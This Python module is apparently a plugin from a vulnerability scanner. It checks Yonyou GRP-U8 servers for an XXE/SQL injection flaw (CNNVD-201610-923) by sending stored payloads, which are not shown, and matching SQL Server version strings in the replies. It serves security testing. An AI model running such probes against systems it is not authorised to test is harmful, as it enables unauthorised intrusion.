#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
import re

def cnnvd_201610_923_scan(self, url):
    '''  
        用友GRP-u8存在XXE漏洞, 该漏洞源于应用程序解析XML输入时没有禁止外部实体的加载, 导致可加载外部SQL语句
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name + 'GRP-U8'
    vul_info['vul_type'] = 'SQLinject/RCE'
    vul_info['vul_id'] = 'CNNVD-201610-923'
    vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.cnnvd_201610_923_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=self.headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            version_re = r'column[1-4]{1}="Microsoft SQL Server \d{1,5} -.*Copyright.*Microsoft Corporation.*"'

            if (re.search(version_re, res.text, re.I|re.M|re.S|re.U)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
